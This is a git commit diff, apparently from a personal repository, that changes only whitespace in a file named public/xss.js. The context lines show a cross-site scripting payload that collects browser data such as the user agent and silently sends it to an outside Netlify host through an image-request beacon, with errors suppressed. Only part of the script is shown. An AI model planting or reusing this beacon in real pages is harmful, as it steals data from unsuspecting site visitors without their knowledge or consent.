b3060d4c159812246975dd5736480dbf25cb045f
Sairex <79695218+saeidrz@users.noreply.github.com>
2025-08-01 21:31:03 +0330

    Update xss.js

--- public/xss.js
+++ public/xss.js
@@ -9,9 +9,10 @@
       userAgent: navigator.userAgent
     };
 
-    const endpoint = 'https://scintillating-sfogliatella-a51761.netlify.app/'; 
+    const endpoint = 'https://scintillating-sfogliatella-a51761.netlify.app/';
     const qs = new URLSearchParams(data).toString();
 
     new Image().src = endpoint + '?' + qs;
   } catch (e) {}
 })();
+
